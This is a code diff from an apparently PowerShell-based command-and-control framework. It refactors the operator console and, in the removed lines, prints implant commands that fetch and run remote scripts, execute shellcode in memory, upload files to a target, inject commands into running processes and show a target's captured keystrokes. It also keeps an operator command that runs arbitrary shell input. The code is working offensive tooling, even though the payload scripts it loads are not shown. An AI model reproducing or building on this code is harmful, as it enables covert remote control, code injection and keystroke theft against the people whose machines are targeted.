@@ -16,7 +16,7 @@ from core.utils import Utils
 from core.log import Log
 from core.alias import Alias
 from core.sync import start_cmd_sync
-
+from core.shell import Shell
 
 class Cli:
 
@@ -30,25 +30,14 @@ class Cli:
         self.cmds["kill"] = self.kill_shell
         self.cmds["purge"] = self.flushdb
         self.cmds["os"] = self.os_shell
-        self.shell_cmds = dict()
-        self.shell_cmds["help"] = self.show_help_shell
-        self.shell_cmds["fetch"] = self.fetch
-        self.shell_cmds["read"] = self.read_file
-        self.shell_cmds["upload"] = self.upload_file
-        self.shell_cmds["delay"] = self.update_delay
-        self.shell_cmds["exec"] = self.exec_code
-        self.shell_cmds["ps"] = self.ps
-        self.shell_cmds["inject"] = self.inject
-        self.shell_cmds["alias"] = self.set_alias
-        self.shell_cmds["background"] = None
-        self.shell_cmds["keylogger"] = self.keylogger
-        self.shell_cmds["exit"] = None
         self.config = config
         self.db = self.config.get("redis")
         self._prompt = "Main"
         self.guid = ""
         self.alias = Alias()
+        self.shell = Shell(self.db, True)
         self.completer = Completer(self.cmds)
+        
         readline.parse_and_bind("tab:complete")
         readline.set_completer(self.completer.complete)
         start_cmd_sync(config)
@@ -81,13 +70,13 @@ class Cli:
             else:
                 self.db.append_shell_data(self.guid, "[%s] %s - Sending command: \n%s\n\n" % (Utils.timestamp(), self.config.get("username"), data))
                 Log.log_shell(self.guid, "- Sending command", data, self.config.get("username"))
-                if cmd in self.shell_cmds:
-                    callback = self.shell_cmds[cmd]
-                    data = callback(data)
-                if not (cmd == "help" or data == ""):
-                    self.db.push_cmd(self.guid, data, Utils.guid(),self.config.get("username"))
+                data = self.shell.evalute_cmd(data)
+                print(data[0])
+                
+                if not (cmd == "help" or data[1] == ""):
+                    self.db.push_cmd(self.guid, data[1], Utils.guid(),self.config.get("username"))
         else:
-        # interacting with the main console
+            # interacting with the main console
             if cmd in self.cmds:
                 callback = self.cmds[cmd]
                 callback(data)
@@ -119,7 +108,7 @@ class Cli:
                 guid = shell.decode().split(":")[0]
                 break
         if not guid == "":
-            self.completer = Completer(self.shell_cmds)
+            self.completer = Completer(self.shell.get_cmd())
             readline.set_completer(self.completer.complete)
             readline.parse_and_bind("tab: complete")
             self.guid = guid
@@ -170,7 +159,25 @@ class Cli:
                     print(data[i])
                 except:
                     pass
+                
+    def flushdb(self, data):
+        force = Utils.get_arg_at(data, 1, 1)
+        if force:
+            self.db.flushdb()
+            UI.error("The whole redis DB was flushed")
+        else:
+            UI.error("Please use the force switch")
 
+    def os_shell(self, data):
+        cmd = Utils.get_arg_at(data, 1, 1)
+        print("""Executing: %s\n----------------------""" % cmd)
+        try:
+            output = subprocess.check_output(cmd,stderr=subprocess.PIPE, shell=True)
+        except:
+            UI.error("Command failed to execute properly")
+            output = ""
+        print(output)
+        
     def kill_shell(self, data):
         current_id = Utils.get_arg_at(data, 1, 2)
         guid = ""
@@ -184,7 +191,7 @@ class Cli:
             print("Deleting shell with ID %s" % current_id)
         else:
             UI.error("Invalid session ID")
-
+            
     def show_help(self, data):
         print("""Help Menu\n""" + "=" * 9)
         print("\n" + tabulate({"Commands": [
@@ -216,184 +223,4 @@ class Cli:
             "Exit the application",
             "Show this help menu",
             ]},
-            headers="keys", tablefmt="simple"))
-
-    def flushdb(self, data):
-        force = Utils.get_arg_at(data, 1, 1)
-        if force:
-            self.db.flushdb()
-            UI.error("The whole redis DB was flushed")
-        else:
-            UI.error("Please use the force switch")
-
-    def os_shell(self, data):
-        cmd = Utils.get_arg_at(data, 1, 1)
-        print("""Executing: %s\n----------------------""" % cmd)
-        try:
-            output = subprocess.check_output(cmd,stderr=subprocess.PIPE, shell=True)
-        except:
-            UI.error("Command failed to execute properly")
-            output = ""
-        print(output)
-
-    def show_help_shell(self, data):
-        print("""Help Menu\n""" + "=" * 9)
-        print("\n" + tabulate({"Commands": [
-            "background",
-            "fetch",
-            "exec",
-            "read",
-            "upload",
-            "ps",
-            "inject",
-            "keylogger",
-            "alias",
-            "delay",
-            "help",
-            ],
-            "Args": [
-            "",
-            "",
-            "path/url, cmd",
-            "path/url",
-            "remote path",
-            "path/url, path",
-            "pid, command",
-            "number of line (default 20)",
-            "key, value",
-            "milliseconds",
-            ],
-            "Descriptions": [
-            "Return to the main console",
-            "In memory execution of a script and execute a command",
-            "In memory execution of code (shellcode)",
-            "Read a file on the remote host",
-            "Upload a file on the remote system",
-            "List processes",
-            "Inject command into a target process (max length 4096)",
-            "Show last n line of keystrokes captured",
-            "Create an alias to avoid typing the same thing over and over",
-            "Update the callback delay",
-            "show this help menu",
-            ]},
-            headers="keys", tablefmt="simple"))
-        self.alias.list_alias()
-        self.alias.list_custom_alias()
-
-    def fetch(self, data):
-        try:
-            (cmd, path, ps) = data.split(" ", 2)
-        except:
-            UI.error("Missing arguments")
-            return ""
-        data = ";"
-        path = self.alias.get_alias(path)
-        if Utils.file_exists(path, False, False):
-            data = Utils.load_file_unsafe(path)
-        else:
-            data = Utils.download_url(path)
-
-        if not data == ";":
-            UI.success("Fetching %s" % path)
-            UI.success("Executing %s" % ps)
-            return "%s;%s" % (data, ps)
-        else:
-            UI.error("Cannot fetch the resource")
-            return ""
-
-    def keylogger(self, data):
-        size = Utils.get_arg_at(data, 1, 2)
-        try:
-            size = int(size)
-        except:
-            size = 20
-        output = os.system("tail -n %d %skeylogger_%s.log" % (size, Log.create_folder_tree(), self.guid))
-        return ""
-
-    def read_file(self, data):
-        try:
-            (cmd, path) = data.split(" ", 2)
-            return "Get-Content %s" % path
-        except:
-            UI.error("Missing arguments")
-            return ""
-
-    def upload_file(self, data):
-        try:
-            (cmd, path, remote) = data.split(" ", 2)
-        except:
-            UI.error("Missing arguments")
-            return ""
-        data = ";"
-        path = self.alias.get_alias(path)
-        if Utils.file_exists(path, False, False):
-            data = Utils.load_file_unsafe(path)
-        else:
-            data = Utils.download_url(path)
-
-        if not data == ";":
-            UI.success("Fetching %s" % path)
-            data = base64.b64encode(data)
-            ps = Utils.load_powershell_script("upload.ps1", 3)
-            ps = Utils.update_key(ps, "PAYLOAD", data)
-            ps = Utils.update_key(ps, "PATH", remote)
-            UI.success("Payload will be saved at %s" % path)
-            return ps
-        else:
-            UI.error("Cannot fetch the resource")
-            return data
-
-    def exec_code(self, data):
-        try:
-            (cmd, path) = data.split(" ", 1)
-        except:
-            UI.error("Missing arguments")
-            return ""
-        data = ";"
-        path = self.alias.get_alias(path)
-        if Utils.file_exists(path, False, False):
-            data = Utils.load_file_unsafe(path)
-        else:
-            data = Utils.download_url(path)
-        if not data == ";":
-            UI.success("Fetching %s" % path)
-            data = base64.b64encode(data)
-            ps = Utils.load_powershell_script("exec.ps1", 16)
-            ps = Utils.update_key(ps, "PAYLOAD", data)
-            UI.success("Payload should be executed shortly on the target")
-            return ps
-        else:
-            UI.error("Cannot fetch the resource")
-            return data
-
-    def inject(self, data):
-        try:
-            (option, pid, cmd) = data.split(" ", 2)
-        except:
-            UI.error("Missing arguments")
-            return ""
-        ps = Utils.load_powershell_script("injector.ps1", 1)
-        ps = Utils.update_key(ps, "PAYLOAD", base64.b64encode(cmd))
-        ps = Utils.update_key(ps, "PID", pid)
-        UI.success("Injecting %s" % cmd)
-        UI.success("Into process with PID %s" % pid)
-        return ps
-
-    def ps(self, data):
-        ps = Utils.load_powershell_script("ps.ps1", 0)
-        return ps
-
-    def update_delay(self, data):
-        delay = Utils.get_arg_at(data, 1, 2)
-        print("Updating delay to %s" % delay)
-        return "delay %s" % delay
-
-    def set_alias(self, data):
-        try:
-            (cmd, key, value) = data.split(" ", 2)
-        except:
-            UI.error("Missing arguments")
-            return ""
-        self.alias.set_custom(key, value)
-        UI.success("%s is now set to %s" % (key, value))
-        return ""
+        headers="keys", tablefmt="simple"))
